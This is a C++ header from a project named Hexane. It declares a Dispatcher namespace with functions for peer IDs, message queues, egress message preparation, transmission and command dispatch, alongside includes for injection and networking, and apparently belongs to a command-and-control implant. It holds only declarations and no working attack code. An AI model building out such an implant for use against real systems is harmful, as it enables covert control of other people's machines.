#ifndef HEXANE_CORELIB_DISPATCH_HPP
#define HEXANE_CORELIB_DISPATCH_HPP

#include <core/monolith.hpp>
#include <core/include/names.hpp>
#include <core/include/memory.hpp>
#include <core/include/inject.hpp>
#include <core/include/stream.hpp>
#include <core/include/parser.hpp>
#include <core/include/network.hpp>
#include <core/include/clients.hpp>
#include <core/include/utils.hpp>

namespace Dispatcher {
    FUNCTION DWORD PeekPeerId(const _stream *stream);
    FUNCTION VOID AddMessage(_stream *out);
    FUNCTION VOID RemoveMessage(_stream *target);
    FUNCTION VOID OutboundQueue(_stream *out);
    FUNCTION VOID QueueSegments(uint8_t *buffer, uint32_t length);
    FUNCTION VOID PrepareEgressMessage(_stream *out);
    FUNCTION VOID MessageTransmit();
    FUNCTION VOID CommandDispatch (const _stream *in);
}
#endif //HEXANE_CORELIB_DISPATCH_HPP

